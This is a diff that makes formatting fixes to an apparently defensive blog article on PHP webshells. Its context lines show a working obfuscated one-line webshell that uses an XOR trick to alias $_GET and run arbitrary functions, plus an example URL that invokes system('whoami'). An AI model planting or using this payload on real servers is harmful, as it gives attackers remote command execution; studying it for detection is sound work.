@@ -447,7 +447,7 @@ This part generates a global variable:
 $_=${'_'.('\{\{\{' ^ '<>/')};
 ```
 
-- `{{{ ^ <>/` performs a bitwise operation between strings.
+- `\{\{\{ ^ <>/` performs a bitwise operation between strings.
 - XOR compares each bit of both strings and returns a new character.
 
 Let's see what value this XOR operation generates:
@@ -460,10 +460,10 @@ Therefore, the variable $_ is defined as:
 $_ = $_GET;
 ```
 
-This means that $_ is now an alias for $_GET, which contains the parameters sent in the URL.
+This means that `$_` is now an alias for `$_GET`, which contains the parameters sent in the URL.
 The second part execute the code:
 
- ```
+```
  $_[0]($_[1]);
 ```
 
@@ -480,7 +480,6 @@ http://example.com/shell.php?0=system&1=whoami
 ## Conclusion
 
 In conclusion, webshells are a powerful yet dangerous tool when leveraged by attackers to gain unauthorized control over a web server. While PHP, ASPX, and Java provide various means for attackers to exploit native functions, it is essential to understand both the methods and the consequences of such compromises. By examining common webshell tactics, like using native functions to execute system commands, we can better recognize and defend against these types of attacks.
-
 
 ## References
 - [PHP Documentation](https://www.php.net/docs.php){:target="_blank"}
